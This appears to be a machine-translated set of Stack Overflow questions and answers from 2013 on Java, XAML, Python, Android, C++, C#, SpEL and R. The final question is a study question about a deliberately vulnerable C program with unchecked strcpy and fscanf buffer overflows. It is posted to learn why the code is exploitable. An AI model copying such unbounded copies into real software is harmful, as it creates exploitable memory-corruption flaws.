由于错误消息特定于每个数据库（您会在 Oracle 上收到与在 MySQL 上不同的错误消息），并且每个数据库以不同的方式处理这些错误，因此可能没有通用的方法。Spring 框架将数据库错误封装到丰富的异常层次结构中，您可能想看看它们如何以通用方式处理这些错误。

一种选择是扩展 Maven SQL 插件并在其中添加该功能。如果您可以跨数据库以通用方式执行此操作，那就更好了，但我想如果您可以使其仅适用于 MySQL，那已经对您有所帮助。

您想提供更友好的错误消息的任何具体原因？

# xaml - 在 WinRT 中使用 Windows Phone 示例数据

> ID：15510538
> 
> 赞同：0
> 
> 时间：2013-03-19T21:12:23.503
> 
> 标签：xaml, windows-runtime, windows-phone-8, winrt-xaml, expression-blend

我正在使用 MVVM 制作一个 Windows 8 程序，该程序与 Phone 共享 MVM 部分。

我的问题是，当我尝试在 WinRT 中使用 Windows Phone 项目的 XAML 示例数据时，我得到了一堆错误。我的 XAML 是：

```
<vm:MyViewModel
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:vm="clr-namespace:MyApp.ViewModels" 
> 
```

这显然是错误的，因为使用了 clr-namespace 指令。但是，如果我将其更改为

```
<vm:MyViewModel
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:vm="using:MyApp.ViewModels" 
> 
```

我得到了同样的错误，例如

```
The name "MyViewModel" does not exist in the namespace "using:MyApp.ViewModels" 
```

我可以像在 Windows Phone 中一样在 WinRT 中使用 XAML 文件作为示例吗？我该如何解决这个错误？

谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T08:50:08.720

创建使用示例数据的另一种方法是将 d:DataContext 设置为您的 ViewMode，设置 IsCreatableInDesignTime=True （这意味着它将运行它的构造函数），然后在构造函数中创建一些示例对象。

**XAML：**

```
xmlns:viewmodel="clr-namespace:SampleApp.ViewModels"
d:DataContext="{d:DesignInstance Type=viewmodel:SampleViewModel, IsDesignTimeCreatable=True}"> 
```

**代码隐藏：**

```
public SampleViewModel()
{
   if (DesignerProperties.IsInDesignTool)
   {
      //CREATE DESIGN TIME DATA HERE
   } 
```

}

[DesignerProperties.IsInDesignTool](http://msdn.microsoft.com/en-us/library/system.componentmodel.designerproperties%28v=vs.95%29.aspx)是[System.ComponentModel](http://msdn.microsoft.com/en-us/library/system.componentmodel%28v=vs.95%29.aspx)的一部分，并根据您是否处于设计时返回布尔值，这意味着当您运行应用程序时，它将始终返回 false。如果您正在为 Windows Phone 和 Silverlight 进行开发，这将起作用。

[如果您正在为 Windows 应用商店开发，您可以改为使用Windows.ApplicationModel.DesignMode.DesignModeEnabled](http://msdn.microsoft.com/en-us/library/windows/apps/windows.applicationmodel.designmode.designmodeenabled)来检查您是否处于设计阶段。除此之外，它的工作方式相同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T22:14:57.583

很奇怪，但问题是，出于某种原因，编译器无法识别 ViewModel 类，即使它们在哪里。

解决方法：删除 XAML 示例数据文件，clean&build; 然后，重新创建 XAML 示例数据文件（其中包含相同的代码！），就像一个魅力。

# python - 映射字典和列表python

> ID：15510542
> 
> 赞同：1
> 
> 时间：2013-03-19T21:12:36.943
> 
> 标签：python, list, dictionary

如果您有三个列表，最简单的方法是什么

```
list [1,2,3] [a,b,c] [5,6,7] 
```

用字典映射它

```
{1:{'a':5}, 2:{'b':6}, 3:{'c':7}} 
```

感觉你必须使用 zip ..

在无法理解字典的python中如何做到这一点

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:17:20.847

更新中的 3-list 案例很简单`zip`：

```
d = {k:{k1:v1} for k,k1,v1 in zip(list1,list2,list3)} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-19T21:16:46.660

字典没有顺序，所以我假设你想根据排序键的顺序来映射它们。您可以通过以下方式做到这一点：

```
>>> lst = [1, 2, 3]
>>> dct = {'a': 5, 'b': 6, 'c': 7}
>>> {i: {k: dct[k]} for i, k in zip(lst, sorted(dct))}
{1: {'a': 5}, 2: {'b': 6}, 3: {'c': 7}} 
```

如果您决定使用元组列表而不是字典来维护顺序，您可以执行以下操作：

```
>>> lst = [1, 2, 3]
>>> tups = [('a', 5), ('b', 6), ('c', 7)]
>>> {i: {k: v} for i, (k, v) in zip(lst, tups)}
{1: {'a': 5}, 2: {'b': 6}, 3: {'c': 7}} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:53:39.073

第一个和第二个列表中的值是否可以重复，例如：

```
a, b, c = [3,1,2,3,1], ['a','a','b','c','d'], [1,5,6,7,8] 
```

如果您需要订购：

```
from collections import OrderedDict
od = OrderedDict()
for x, y, z in zip(a, b, c):
    if x not in od:
        od[x] = OrderedDict()
    od[x][y] = z
print od 
```

输出：

```
OrderedDict([(3, OrderedDict([('a', 1), ('c', 7)])), (1, OrderedDict([('a', 5), ('d', 8)])), (2, OrderedDict([('b', 6)]))]) 
```

如果您不需要订单：

```
from collections import defaultdict
dd = defaultdict(dict)
for x, y, z in zip(a,b,c):
    dd[x][y] = z
print dd 
```

输出：

```
defaultdict(<type 'dict'>, {1: {'a': 5, 'd': 8}, 2: {'b': 6}, 3: {'a': 1, 'c': 7}}) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T22:02:28.083

使用效率更高的**izip**

```
from itertools import izip

a = [1, 2, 3]
b = ['a', 'b', 'c']
c = [5, 6, 7]

print {a: {b: c} for a, b, c in izip(a, b, c)} 
```

**输出：**

```
{1: {'a': 5}, 2: {'b': 6}, 3: {'c': 7}} 
```

# android - android 广播播放器多个链接

> ID：15510546
> 
> 赞同：1
> 
> 时间：2013-03-19T21:12:52.210
> 
> 标签：android, stream, shoutcast

我正在尝试更新我的广播广播应用程序。

它现在可以工作了，它播放一个电台链接，如果你点击播放按钮，一个流将以 128kbps 的速度播放。

我现在要做的是添加另一个站链接，所以我将为每个链接有两个按钮，如果一个流正在播放另一个流将不会启动，那么最好。

我正在为媒体播放器使用服务。

这就是我现在所拥有的。

我的服务：

```
public class My_Service extends Service implements OnBufferingUpdateListener {
private static final String TAG = "MyService";
public MediaPlayer mediaPlayer;
private final Handler m_handler = new Handler();

@Override
public void onCreate() {
    Toast.makeText(this, "My Service Created", Toast.LENGTH_LONG).show();
    Log.d(TAG, "onCreate");
    String url = "http://url/";
    try 
    {
        mediaPlayer = new MediaPlayer();
        mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
        mediaPlayer.setDataSource(url);
        mediaPlayer.setOnBufferingUpdateListener(this);
        mediaPlayer.prepare();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } // might take long! (for buffering, etc)
}
@Override
public void onStart(Intent intent, int startid) {
    mediaPlayer.start(); 
```

我的主要活动：

```
 public void onClick(View v) {

        // TODO Auto-generated method stub
        if (playStop.isChecked() && UtilityClass.isInternetOn(this))
        {
            Log.d(TAG, "onClick: buffering... : " +  "%");
            Log.d(TAG, "onClick: starting srvice");
            startService(new Intent(this, My_Service.class));
        }
        else if(UtilityClass.isInternetOn(this))
        {

            Log.d(TAG, "onClick: stopping srvice");
            stopService(new Intent(this, My_Service.class));
        }
    }
} 
```

# c++ - 整数在 Visual Studio 2012 c++ 中改变自己的值

> ID：15510547
> 
> 赞同：2
> 
> 时间：2013-03-19T21:12:52.267
> 
> 标签：c++, random, integer, default-value

此类的大小变量在构造函数中设置为零。仅当您将项目添加到数组或删除一个项目时，它才会增加或减少，在这种情况下切割成两半，大小会减少到 1/2 容量。

但是，我的 size 变量似乎跑掉了，随机变成了随机数，就像 516846 一样，不在它设置的大小范围内。我检查并遵循了我的程序，找不到任何改变尺寸的东西，我知道尺寸和容量是在施工时设置的。

```
#pragma once

#include <string>
#include <iostream>
using namespace std;

template <typename ItemType>
class Node 
    {
    private:
        ItemType* items;
        int size;
        int capacity;

    public:
        Node* nextNode;
        Node* prevNode;

        Node(Node* pNode, Node* nNode, int limit)
        {
            prevNode = pNode;
            nextNode = nNode;
            capacity = limit;
            size = 0;

            if(capacity != 0)
                items = new ItemType[capacity];

            cout << "Node() capcity = " << capacity << " size = " << size << endl;
        };

        ~Node(void){};

        int getSize()
        {
            return size;
        };

        void addItem(int index, ItemType item)
        {
            cout << "node->addItem" << endl;
            for(int i = (getSize() - 1); i >= index; i--)
            {
                items[i + 1] = items[i];
            }
            items[index] = item;
            size ++;
        };
        void addItem(ItemType item)
        {
            cout << "node->addItem" << endl;
            items[getSize()] = item;
            size ++;
        };

        void deleteItem(int index)
        {
            cout << "node->deleteItem index = " << index << endl;

            for(int i = index; i < (getSize() - 1); i++)
            {
                items[i] = items[i+1];
            }
            size --;
        };

        void cleaveInHalf()
        {
            cout << "node->cleaveInHalf" << endl;
            size = capacity/2;
        };

        bool isFull()
        {
            return ((getSize() >= capacity) ? true : false);
        };

    }; 
```

当调用 isFull() 函数时，我收到错误“访问冲突读取位置 0x00000004”。大小是一些奇怪的数字，例如 51515615。

```
 void insert(int index, const ItemType& item) 
    {
        cout << "lal->insert" << endl;
        if (index > size)
            return;

        //if we have no nodes to hold data make a new one between head and tail
        if (head->nextNode == tail)
        {
            linkNewNode(head, tail);
        }
        // lets find the node to put it in and the spot in the array of the node
        int indexIntoArray = 0;
        Node<ItemType>* temp = getNodeContainingIndex(index, indexIntoArray);
        if(temp->isFull())
        {
            // if we are full then we ant to split, and then call this function again to find the new location to go in.
            splitNode(temp);
            insert(index, item);
            return;
        }
        // and now insert it in
        cout << "lal->----attempting to add item at " << indexIntoArray << endl;
        temp->addItem(indexIntoArray, item);
        size ++;
    };

    Node<ItemType>* getNodeContainingIndex(int index, int& indexIntoArray)
    {
        cout << "lal->getNodeContainingIndex" << endl;
        Node<ItemType>* temp;
        if (index == size)
        {
            temp = tail->prevNode;
            indexIntoArray = temp->getSize();
        }
        else if (index <= (size/2)) /* coming from 0*/
        {
            cout << "lal->----coming from 0" << endl;
            int position = 0;
            temp = head->nextNode;
            position = position + temp->getSize();

            while (position < index)
            {
                temp = temp->nextNode;
                position = position + temp->getSize();
            }
            indexIntoArray = index - (position - temp->getSize());
            return temp;
        } 
        else /*coming from size*/
        {
            cout << "lal->----coming from size = " << size << endl;
            int position = size;
            temp = tail;
            while (position > index)
            {
                temp = temp->prevNode;
                position = position - temp->getSize();
            }
            indexIntoArray = abs(position - index);
            return temp;
        }
    }

    Node<ItemType>* linkNewNode(Node<ItemType>* prev, Node<ItemType>* next)
    {
        cout << "lal->linkNewNode" << endl;
        Node<ItemType>* temp = new Node<ItemType>(prev, next, arrayCapacity);
        prev->nextNode = temp; next->prevNode = temp;
        numOfNodes ++;
        return temp;
    } 
```

它在 getNodeContainingIndex 函数中中断的地方，就在这里

```
int indexIntoArray = 0;
Node<ItemType>* temp = getNodeContainingIndex(index, indexIntoArray);
if(temp->isFull())
{ 
```

在 temp->isFull() 行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:36:50.100

您正在发生错误，因为`LinkedArrayList`您正在调用的指针`isFull`为空。我可以这样说，因为您在 0x00000004 错误处遇到访问冲突；并且以这种方式导致具有看起来像这样的数字的访问冲突。`size`4 来自对象开头的偏移量；无意义的值，`size`因为您的指针是垃圾。

看起来有一条`getNodeContainingIndex`不返回值的路径（where `index == size`）；这可能会导致您的问题。但实际上，您最好单步调试调试器，看看它在做什么。

# c# - C# 使用登录的用户凭据启动进程

> ID：15510559
> 
> 赞同：0
> 
> 时间：2013-03-19T21:13:21.230
> 
> 标签：c#, windows, winforms, impersonation

我正在运行具有提升的用户权限的 winforms 应用程序（模拟作为不同的域管理员帐户运行），但是我想启动一个子进程，用当前登录的用户权限打开一个 Web 浏览器到一个 URL，而不是没有提升的权限必须提示他们输入密码和登录信息，以便它正确地与当前登录的用户权限握手 NTLM。

我试过类似的东西：

```
// I have the USER NAME, this is not the issue
// I have the Domain, this is not the issue

// I need to grab the Password from the currently logged on user 
// without prompting for it

System.Security.SecureString oPass = new System.Security.SecureString();
System.Diagnostics.Process.Start("IExplore.exe"
   , this.oConfiguration.WrappersURL
   , this.WindowsUserID
   , oPass
   , this.DomainName
  ); 
```

..但我不太确定如何获取用户的密码。关于如何减少 W7 和 XP 兼容的登录用户对生成进程的权限的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:22:31.940

获取当前用户并以这种方式启动它：

```
ProcessStartInfo startInfo = new ProcessStartInfo();
startInfo.UserName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
Process.Start(startInfo); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:26:14.147

您想要获取 DomainName 和 UserName 执行以下操作

编辑：

```
var userNameSplit = System.Security.Principal.WindowsIdentity.GetCurrent().Name.Split('\\');
var userDomain = userNameSplit[0];
var userName = userNameSplit[1]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-27T21:48:58.870

似乎没有办法在 Windows 中执行此操作，因此我最终通过执行以下操作解决了这个困境：

1.  在当前用户下生成一个控制器进程。
2.  在当前登录的用户下生成任务进程。
3.  生成另一个任务进程并将其权限提升到管理帐户。
4.  使用控制器进程来管理/通知两个任务进程（除了凭据之外它们是相同的）。
5.  在某些情况下，让用户进程初始化运行程序应用程序，然后让管理任务指导应用程序工作。

丑陋，骇人听闻，有点令人费解，但这就是企业安全：D

# java - 评估 Spring Expression Lang (SpEL) 中的属性

> ID：15510563
> 
> 赞同：6
> 
> 时间：2013-03-19T21:13:28.010
> 
> 标签：java, spring, properties, expression, spring-el

我们的服务有一个根据属性文件安排的进程，读取属性**refreshIntervalMillis**。它的值通过以下配置直接注入到 Quartz 触发器中：

```
<bean name="trigger"
    class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean "
    p:repeatInterval="${refreshIntervalMillis}"> 
...
</bean> 
```

但是，安装此服务的管理员会考虑小时/天数，因此为了让他们更轻松，我们将其更改为：

1.  **将refreshIntervalMillis**重命名为**refreshIntervalMinutes**
2.  将上面的代码更改为以下内容：

```
p:repeatInterval="#{ 1000 * 60 * T(java.lang.Integer).valueOf(@configurationProperties['garbageLevelWatcher.refreshIntervalMinutes'])}"

```

注意：属性对象公开为名为“configurationProperties”的 bean

是否有更简单的语法来完成相同的操作？

谢谢，

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-19T21:47:56.283

`"#{T(java.util.concurrent.TimeUnit).MINUTES.toMillis( @configurationProperties['garbageLevelWatcher.refreshIntervalMinutes'])}"`

编辑：

或者...

```
<context:property-placeholder properties-ref="configurationProperties"
<util:constant id = "MINUTES" static-field="java.util.concurrent.TimeUnit.MINUTES" /> 
```

和

```
"#{@MINUTES.toMillis(${garbageLevelWatcher.refreshIntervalMinutes})}" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:15:58.197

如果属性由 PropertyPlaceholderConfigurer、@PropertySource 或 <context:property-placeholder /> 查找并且上下文知道它

你可以这样写：

```
p:repeatInterval="#{ 1000 * 60 * T(java.lang.Integer).valueOf('${garbageLevelWatcher.refreshIntervalMinutes}') }" 
```

# r - 在多个列上嵌套 if else 语句

> ID：15510566
> 
> 赞同：7
> 
> 时间：2013-03-19T21:13:36.033
> 
> 标签：r, loops, if-statement, dataframe

我有一个很大`data.frame`的前三列包含有关**标记**的信息。其余列是每个个体中该标记的数字类型。每个人都有三列。数据集如下所示：

```
 marker alleleA alleleB   X818 X818.1 X818.2   X345 X345.1 X345.2   X346 X346.1 X346.2
1   kgp5209280_chr3_21902067       T       A 0.0000 1.0000 0.0000 1.0000 0.0000 0.0000 0.0000 1.0000 0.0000
2 chr3_21902130_21902131_A_T       A       T 0.8626 0.1356 0.0018 0.7676 0.2170 0.0154 0.8626 0.1356 0.0018
3 chr3_21902134_21902135_T_C       T       C 0.6982 0.2854 0.0164 0.5617 0.3749 0.0634 0.6982 0.2854 0.0164 
```

也就是说，对于每个标记（行），每个人都有三个值，每列一个。

我想创建一个新的`data.frame`，它具有与原始行相同的所有行，但每个人只有一列。在每个人的一列中，我希望每个人的三列中的值大于 0.8。如果没有值大于 0.8，那么我想打印 NA。例如，在我为第一行给出的数据集中，我希望第二个值是 818 (1.0000)，第一个值是 345 (1.0000)。在第二行中，我想要 818 (0.8626) 的第一个值，对于 345，没有一个值高于 0.8，所以我想要打印 NA 等等。因此，新数据集将如下所示：

```
 marker alleleA alleleB   X818 X345
1   kgp5209280_chr3_21902067       T       A 1.0000    1
2 chr3_21902130_21902131_A_T       A       T 0.8626   NA 
```

我一直在尝试使用`if/else`语句，`if [, 4] > 0.8 then [, 4], else...`但是它似乎并没有给我想要的东西，而且我还必须循环这个命令，所以它不只是为前三列中的一个人做但对于所有列。

任何帮助，将不胜感激！提前致谢。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-19T21:31:17.443

### `data.table`编辑：使用版本 >= 1.9.0中实施的快速熔化/dcast 方法更新解决方案。去[**这里**](https://stackoverflow.com/a/6913151/559784)了解更多信息。

```
require(data.table)
require(reshape2)
dt <- as.data.table(df)

# melt data.table
dt.m <- melt(dt, id=c("marker", "alleleA", "alleleB"), 
                 variable.name="id", value.name="val")
dt.m[, id := gsub("\\.[0-9]+$", "", id)] # replace `.[0-9]` with nothing
# aggregation
dt.m <- dt.m[, list(alleleA = alleleA[1], 
         alleleB = alleleB[1], val = max(val)), 
        keyby=list(marker, id)][val <= 0.8, val := NA]
# casting back
dt.c <- dcast.data.table(dt.m, marker + alleleA + alleleB ~ id)
#                        marker alleleA alleleB X345   X346   X818
# 1: chr3_21902130_21902131_A_T       A       T   NA 0.8626 0.8626
# 2: chr3_21902134_21902135_T_C       T       C   NA     NA     NA
# 3:   kgp5209280_chr3_21902067       T       A    1 1.0000 1.0000 
```

* * *

**解决方案1：**可能不是最好的方法，但这是我目前能想到的：

```
mm <- t(apply(df[-(1:3)], 1, function(x) tapply(x, gl(3,3), max)))
mode(mm) <- "numeric"
mm[mm < 0.8] <- NA 
# you can set the column names of mm here if necessary
out <- cbind(df[, 1:3], mm)

#                       marker alleleA alleleB      1  2      3
# 1   kgp5209280_chr3_21902067       T       A 1.0000  1 1.0000
# 2 chr3_21902130_21902131_A_T       A       T 0.8626 NA 0.8626
# 3 chr3_21902134_21902135_T_C       T       C     NA NA     NA 
```

`gl(3,3)`给出一个因子，其值为`1,1,1,2,2,2,3,3,3`levels `1,2,3`. 也就是说，`tapply`将一次取值`x`3 并获取它们的值`max`（前 3 个，下一个 3 和最后一个 3）。并`apply`逐行发送。

* * *

**解决方案 2：**一个`data.table`有`melt`和**无**使用`cast`的解决方案or ：`data.table` **`reshape``reshape2`**

 **```
require(data.table)
dt <- data.table(df)
# melt your data.table to long format
dt.melt <- dt[, list(id = names(.SD), val = unlist(.SD)), 
                  by=list(marker, alleleA, alleleB)]
# replace `.[0-9]` with nothing
dt.melt[, id := gsub("\\.[0-9]+$", "", id)]
# get max value grouping by marker and id
dt.melt <- dt.melt[, list(alleleA = alleleA[1], 
                      alleleB = alleleB[1], 
                      val = max(val)), 
        keyby=list(marker, id)][val <= 0.8, val := NA]
# edit mnel (use setattr(,'names') to avoid copy by `names<-` within `setNames`
dt.cast <- dt.melt[, as.list(setattr(val,'names', id)), 
                   by=list(marker, alleleA, alleleB)]

#                        marker alleleA alleleB X345   X346   X818
# 1: chr3_21902130_21902131_A_T       A       T   NA 0.8626 0.8626
# 2: chr3_21902134_21902135_T_C       T       C   NA     NA     NA
# 3:   kgp5209280_chr3_21902067       T       A    1 1.0000 1.0000 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-19T22:25:03.560

我认为最好在这里将您的数据以长格式放置。这里是基于`reshape2`package 的解决方案，可能类似于第二个 @Arun 解决方案，但语法不同

```
library(reshape2)
dat.m <- melt(dat,id.vars=1:3)
dat.m$variable <- gsub('[.].*','',dat.m$variable)
dcast(dat.m,...~variable,fun.aggregate=function(x){
   res <- NA_real_
   if(length(x) > 0 && max(x)> 0.8)
      res <- max(x)
   res
})

                      marker alleleA alleleB X345   X346   X818
1 chr3_21902130_21902131_A_T       A       T   NA 0.8626 0.8626
2 chr3_21902134_21902135_T_C       T       C   NA     NA     NA
3   kgp5209280_chr3_21902067       T       A    1 1.0000 1.0000 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:35:01.833

这是我使用该功能的方法`pmax`。请注意，如果每个人有两个或多个高于 0.8 的值，这将为您提供最大值：

```
df <- read.table(textConnection("                      marker alleleA alleleB   X818 X818.1 X818.2   X345 X345.1 X345.2   X346 X346.1 X346.2
1   kgp5209280_chr3_21902067       T       A 0.0000 1.0000 0.0000 1.0000 0.0000 0.0000 0.0000 1.0000 0.0000
2 chr3_21902130_21902131_A_T       A       T 0.8626 0.1356 0.0018 0.7676 0.2170 0.0154 0.8626 0.1356 0.0018
3 chr3_21902134_21902135_T_C       T       C 0.6982 0.2854 0.0164 0.5617 0.3749 0.0634 0.6982 0.2854 0.0164"), header=TRUE)

#data.table solution
library(data.table)
DT <- as.data.table(df)
DT[, M818 := ifelse(pmax(X818, X818.1, X818.2) > 0.8, pmax(X818, X818.1, X818.2), NA)]
DT[, M345 := ifelse(pmax(X345, X345.1, X345.2) > 0.8, pmax(X345, X345.1, X345.2), NA)]
DT[, M346 := ifelse(pmax(X346, X346.1, X346.2) > 0.8, pmax(X346, X346.1, X346.2), NA)]

#Base R solution
df$M818 <- ifelse(pmax(df$X818, df$X818.1, df$X818.2) > 0.8, pmax(df$X818, df$X818.1, df$X818.2), NA)
df$M345 <- ifelse(pmax(df$X345, df$X345.1, df$X345.2) > 0.8, pmax(df$X345, df$X345.1, df$X345.2), NA)
df$M346 <- ifelse(pmax(df$X346, df$X346.1, df$X346.2) > 0.8, pmax(df$X346, df$X346.1, df$X346.2), NA) 
```

如果要删除其他列，只需键入：

```
DT[, list(marker, alleleA, alleleB, M818, M345, M346)]
                       marker alleleA alleleB   M818 M345   M346
1:   kgp5209280_chr3_21902067       T       A 1.0000    1 1.0000
2: chr3_21902130_21902131_A_T       A       T 0.8626   NA 0.8626
3: chr3_21902134_21902135_T_C       T       C     NA   NA     NA 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T22:28:34.940

这是另一种可能的解决方案。上述所有解决方案均有效。

我的解决方案是在不使用新库的情况下为您的大小写敏感创建一个函数。它很长并且可以压缩，但是为了了解函数的工作原理，查看每个步骤很有用。

```
olddf <- data.frame(marker = c("kgp5209280_chr3_21902067",
        "chr3_21902130_21902131_A_T",
        "chr3_21902134_21902135_T_C"),
        alleleA = c("T","A","T"),
        alleleB = c("A","T","C"),
        X818 = c(0.0000,0.8626,0.6982),
        X818.1 = c(1.0000,0.1356,0.2854),
        X818.2 = c(0.0000,0.0018,0.0164),
        X345 = c(1.0000,0.7676, 0.5617),
        X345.1 = c(0.0000, 0.2170, 0.3749),
        X345.2 = c(0.0000, 0.0154, 0.0634),   
        X346 = c(0.0000, 0.8626, 0.6982),
        X346.1 = c(1.0000,0.1356, 0.2854), 
        X346.2 = c(0.0000, 0.0018, 0.0164))

mergeallele <- function(arguments,threshold = 0.8){
    n <- nrow(arguments)
    # Creation of a results object as an empty list of length NROW
    # speed for huge data.frame 
    new.lst <- vector(mode="list", n)
    for (i in 1:n){
        marker_row <- arguments[i,]
        colvalue.4 <- NaN
        if (max(marker_row[,c(4:6)]) < threshold){
            colvalue.4 <- max(marker_row[,c(4:6)])
        }

        colvalue.5 <- NaN       
        if (max(marker_row[,c(7:9)]) < threshold){
            colvalue.5 <- max(marker_row[,c(7:9)])
        }

        colvalue.6 <- NaN       
        if (max(marker_row[,c(10:12)]) < threshold){
            colvalue.6 <- max(marker_row[,c(10:12)])
        }
        new.lst[[i]]  <- data.frame(marker_row[,1],
            marker_row[,2],
            marker_row[,3],
            colvalue.4,
            colvalue.5,
            colvalue.6)     
    }   
    new.df <- as.data.frame(do.call("rbind",new.lst))
    names(new.df) <-  c(colnames(arguments)[1],
                    colnames(arguments)[2],
                    colnames(arguments)[3],
                    colnames(arguments)[4],
                    colnames(arguments)[7],
                    colnames(arguments)[10])
    return(new.df)
}

newdf <- mergeallele(olddf)

                      marker alleleA alleleB   X818   X345   X346
1   kgp5209280_chr3_21902067       T       A    NaN    NaN    NaN
2 chr3_21902130_21902131_A_T       A       T    NaN 0.7676    NaN
3 chr3_21902134_21902135_T_C       T       C 0.6982 0.5617 0.6982 
```

关于：

```
threshold = 0.8 
```

您可以设置阈值（例如：0.8）避免更改函数内部的变量

```
new.lst <- vector(mode="list", n) 
```

您可以创建一个长度为旧 data.frame 的空列表，然后列表的元素逐渐填充循环结果（快得多）。从这个[博客查看测试速度](http://menugget.blogspot.dk/2011/11/another-aspect-of-speeding-up-loops-in.html)**

# c++ - 计算新行、制表符和空格

> ID：15510569
> 
> 赞同：0
> 
> 时间：2013-03-19T21:13:42.497
> 
> 标签：c++

我正在通过 C++ Primer 5th edition 自学 C++。我在本书的第 5 章中遇到了一个我不知道如何使用他们迄今为止给我的工具来解决的问题。我有以前的编程经验，并且自己使用`noskipws`. 我正在寻找有关如何以最少的库使用来解决此问题的帮助，想想初学者书籍的前 4-5 章。

问题是在使用 if 语句读取所有元音、空格、制表符和换行符时查找并计算它们。我对这个问题的解决方案是：

```
// Exercise 5.9
int main() 
{
char c;
int aCount = 0;
int eCount = 0;
int iCount = 0;
int oCount = 0;
int uCount = 0;
int blankCount = 0;
int newLineCount = 0;
int tabCount = 0;   
while (cin >> noskipws >> c) 
{       
    if( c == 'a' || c == 'A')
        aCount++;
    else if( c == 'e' || c == 'E')
        eCount++;
    else if( c == 'i' || c == 'I')
        iCount++;
    else if( c == 'o' || c == 'O')
        oCount++;
    else if( c == 'u' || c == 'U')
        uCount++;       
    else if(c == ' ')
        blankCount++;       
    else if(c == '\t')
        tabCount++;     
    else if(c == '\n')
        newLineCount++;     
}
cout << "The number of a's: " << aCount << endl;
cout << "The number of e's: " << eCount << endl;
cout << "The number of i's: " << iCount << endl;
cout << "The number of o's: " << oCount << endl;
cout << "The number of u's: " << uCount << endl;
cout << "The number of blanks: " << blankCount << endl;
cout << "The number of tabs: " << tabCount << endl;
cout << "The number of new lines: " << newLineCount << endl;    
return 0;
} 
```

我能想到解决这个问题的唯一另一种方法是使用 getline() 然后计算它循环的次数以获得“/n”计数，然后逐步遍历每个字符串以找到“/t”和“”。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:24:39.413

`noskipws`您可以通过替换它来避免

```
while (cin >> noskipws >> c) 
```

和

```
while ( cin.get(c) ) 
```

提取运算符`>>`遵守分隔符规则，包括空格。

[`istream::get`](http://en.cppreference.com/w/cpp/io/basic_istream/get)没有，并逐字提取数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:23:49.000

您的代码运行[良好](http://ideone.com/1QfgZY)：

**输入：**

```
This is a test or something
New line
12345
Test 21 
```

**输出：**

```
The number of a's: 1
The number of e's: 5
The number of i's: 4
The number of o's: 2
The number of u's: 0
The number of blanks: 7
The number of tabs: 0
The number of new lines: 3 
```

我建议检查[std::tolower](http://www.cplusplus.com/reference/locale/tolower/) () 函数，以同时测试大写和小写字符。此外，要检查*任何*类型的字母，请查看[std::isalpha](http://www.cplusplus.com/reference/locale/isalpha/) () 、 [std::isdigit](http://www.cplusplus.com/reference/locale/isdigit/) ()、[std::isspace](http://www.cplusplus.com/reference/locale/isspace/) () 和类似函数。

此外，您可以使函数不依赖于 std::cin，而是使用 std::cin 获取字符串，并将字符串传递给函数，这样该函数就可以用于任何字符串，而不仅仅是 std： :cin 输入。

为了避免使用***noskipws***（我个人认为这很好），一个选择是这样做：（作为已经提供的其他解决方案的替代选项）

```
std::string str;
//Continue grabbing text up until the first '#' is entered.
std::getline(cin, str, '#');
//Pass the string into your own custom function, to keep your function detached from the input.
countCharacters(str); 
```

（见[这里的例子](http://ideone.com/zn1jUX)）

# c - 对漏洞利用示例感到困惑？

> ID：15510571
> 
> 赞同：1
> 
> 时间：2013-03-19T21:13:45.803
> 
> 标签：c, security

我正在准备面试，一位在那里工作的朋友给了我这部分代码，他说它很好地准备了一些我将被问到的关于安全性的问题。我对这方面的事情了解不多，希望能学到一点，所以我至少可以说一些我应该被问到的东西。

这是代码：

```
#include <stdio.h>
#include <string.h>
#include <limits.h>
    int main(int argc, char *argv[]){

        FILE *inputFile;
        char filename[128];
        char strings[USHRT_MAX][40];
        unsigned short c = 0;

        strcpy(filename, argv[1]);
        inputFile = fopen (filename, "r");

        if (inputFile == NULL) {
            perror("Error: ");
            return(-1);
        }

        while (fscanf(inputFile, "%s", strings[c++] ) != EOF);
        fclose(inputFile);
    return(0);
    } 
```

我知道它有一个漏洞与能够溢出缓冲区有关，因为这就是他告诉我的，但除此之外我被卡住了。有人可以解释为什么这段代码容易受到攻击吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:44:46.387

首先，我建议您阅读[这本书](http://nostarch.com/hacking2.htm)，它很好地解释了漏洞利用是如何工作的。它带有一个 Linux VM，您可以尝试利用代码。（仅供参考，我与这本书没有任何关系，我只是觉得它很好。）

其次，我想在评论中回答[philippe](https://stackoverflow.com/users/1521926/philippe-lhardy)的问题：return from`main()`并不是程序执行时发生的最后一件事。例如，您可以跳过`return`from`main()`并看到许多有趣的事情发生：

```
Breakpoint 2, main (argc=1, argv=0x7fff5fbff320) at main.c:6
6       return 0;
(gdb) stepi
0x0000000100000f17  6       return 0;
(gdb)
0x0000000100000f1a  6       return 0;
(gdb)
0x0000000100000f1d  6       return 0;
(gdb)
